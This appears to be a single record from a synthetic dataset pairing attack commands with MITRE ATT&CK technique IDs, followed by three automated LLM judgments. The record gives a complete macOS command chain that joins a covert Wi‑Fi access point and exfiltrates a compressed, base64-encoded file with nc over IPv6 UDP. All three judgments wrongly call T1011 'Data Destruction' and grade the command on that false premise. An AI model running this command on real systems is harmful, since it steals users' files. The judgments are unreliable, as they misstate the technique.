command: sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 "plant-165-ap" "P1@nt165" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2
explanation: Compresses and base64-encodes a text file and exfiltrates it via IPv6 UDP over a covert Wi‑Fi SSID on an uncommon port. This ensures use of an alternate wireless medium consistent with T1011.
rationale_steps: Disassociate from any Wi‑Fi in use.
Join a covert AP on a high 5 GHz channel.
Compress and encode the file to make contents less readable in transit.
Transmit via IPv6 UDP on a high port bound to the Wi‑Fi interface.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all utilities (airport -z, networksetup -setairportnetwork, gzip -c, base64, nc -6u with port and -w timeout), and follows correct syntax for chaining commands via pipes.
llm_judgments.semantic_justification: While the command does exfiltrate data via network, it doesn't align with T1011 (Data Destruction) as it doesn't destroy or render data unrecoverable - it merely compresses, encodes and transmits data without removing the original file.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct command separators, balanced quotes, valid flags, and plausible macOS utilities and paths.
llm_judgments.semantic_justification: The command performs data exfiltration, which directly contradicts the stated MITRE ATT&CK technique T1011 (Data Destruction) that involves rendering data unrecoverable.

llm_judgments.syntactic_justification: Balanced quoting and proper use of && and pipelines with valid-looking flags and arguments, including IPv6 with scope and nc options.
llm_judgments.semantic_justification: The command performs file exfiltration over Wi‑Fi/IPv6 UDP rather than any data destruction activity, so it is not aligned with the stated technique description.
